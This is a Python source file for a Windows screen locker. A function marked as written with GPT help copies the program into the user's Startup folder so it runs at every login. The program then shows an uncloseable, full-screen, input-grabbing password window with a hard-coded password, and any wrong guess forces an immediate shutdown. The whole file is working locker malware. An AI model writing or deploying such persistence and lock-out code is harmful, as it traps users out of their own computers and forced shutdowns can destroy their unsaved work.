import tkinter as tk
from tkinter import *
import random
import os
import shutil
import sys

# GPT Help
def add_to_startup():

    startup_dir = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
    current_exe = sys.executable
    dest_path = os.path.join(startup_dir, "DenisApp.exe")

    if not os.path.exists(dest_path):
        try:
            shutil.copy(current_exe, dest_path)
        except Exception as e:
            print("Startup error:", e)

add_to_startup()
#GPT Help End

Pas = "1489"

wn = tk.Tk()
wn.title("TYPE PASSWORD")
wn.geometry('300x200')
wn.protocol("WM_DELETE_WINDOW", lambda: None)
wn.attributes('-topmost', True)
wn.focus_force()
wn.attributes("-fullscreen", True)
wn.grab_set()

fr = tk.Frame(bg='#ffb0ea')
fr.pack(fill=tk.BOTH, expand=True, padx=15, pady=10, side=tk.TOP)
tk.Frame(fr, bg="lightblue").pack(side=tk.TOP, fill=tk.X, pady=20)
tk.Label(fr, bg="#99ccff", text="Type Password:", fg="brown").pack()
en = tk.Entry(fr, width=35)
en.pack(padx=10, pady=10, side=tk.TOP)

def rand():
    num = random.randint(1, 10)
    denis = en.get()
    if denis == Pas:
        wn.destroy()
    else:
        os.system("shutdown /s /t 0 /f")

bt = tk.Button(fr, text="Type", command=rand)
bt.pack(pady=5)

wn.mainloop()
